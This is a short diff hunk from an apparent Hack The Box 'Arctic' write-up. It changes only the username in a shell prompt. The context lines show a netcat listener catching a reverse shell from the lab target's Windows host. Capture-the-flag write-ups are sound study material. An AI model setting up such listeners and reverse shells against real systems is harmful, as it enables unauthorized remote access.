@@ -150,7 +150,7 @@ C:\Users\tolis\Desktop>
 ```
 on our another terminal that we ran `nc`
 ```
-kali@kali:~/HTB/arctic$ nc -nlvp 9696
+bibo318@parrot:~/HTB/arctic$ nc -nlvp 9696
 listening on [any] 9696 ...
 connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49875
 Microsoft Windows [Version 6.1.7600]
